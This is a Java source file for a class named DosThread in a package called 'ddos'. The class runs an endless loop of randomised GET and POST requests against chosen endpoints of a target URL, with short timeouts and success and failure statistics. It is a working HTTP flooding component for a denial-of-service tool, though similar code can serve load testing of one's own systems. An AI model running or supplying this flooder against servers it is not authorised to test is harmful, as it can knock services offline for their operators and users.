package org.example.ddos;

import java.net.URI;
import java.net.URLEncoder;
import java.net.http.*;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.Random;

public class DosThread implements Runnable {
    private static final String[] METHODS = {"GET", "POST"};
    private static final int TIMEOUT_MS = 500;
    private static final HttpClient CLIENT = HttpClient.newBuilder()
            .version(HttpClient.Version.HTTP_1_1)
            .connectTimeout(Duration.ofMillis(TIMEOUT_MS))
            .build();

    private final Random random = new Random();
    private final String[] endpoints;
    private final String baseUrl;

    public DosThread(String baseUrl, String[] endpoints) {
        this.baseUrl = baseUrl;
        this.endpoints = endpoints;
    }

    @Override
    public void run() {
        while (true) {
            try {
                attack();
                Thread.sleep(random.nextInt(30)); // opcjonalny jitter
            } catch (Exception e) {
                DosStat.incrementFailed();
            }
        }
    }

    private void attack() throws Exception {
        DosStat.incrementTotal();

        String endpoint = endpoints[random.nextInt(endpoints.length)];
        String method = METHODS[random.nextInt(METHODS.length)];
        String param = "id=" + URLEncoder.encode(String.valueOf(random.nextInt(10000)), StandardCharsets.UTF_8);
        URI uri = new URI(baseUrl + endpoint);

        HttpRequest.Builder builder = HttpRequest.newBuilder()
                .uri(uri)
                .timeout(Duration.ofMillis(TIMEOUT_MS))
                .header("User-Agent", "Mozilla/5.0 TestBot")
                .header("Connection", "keep-alive");

        if ("POST".equals(method)) {
            builder.POST(HttpRequest.BodyPublishers.ofString(param))
                    .header("Content-Type", "application/x-www-form-urlencoded");
        } else {
            builder.GET();
        }

        HttpRequest request = builder.build();
        long start = System.nanoTime();
        HttpResponse<byte[]> response = CLIENT.send(request, HttpResponse.BodyHandlers.ofByteArray());
        long end = System.nanoTime();

        DosStat.recordTraffic(param.length(), response.body().length);
        DosStat.recordSuccess(end - start);
    }
}
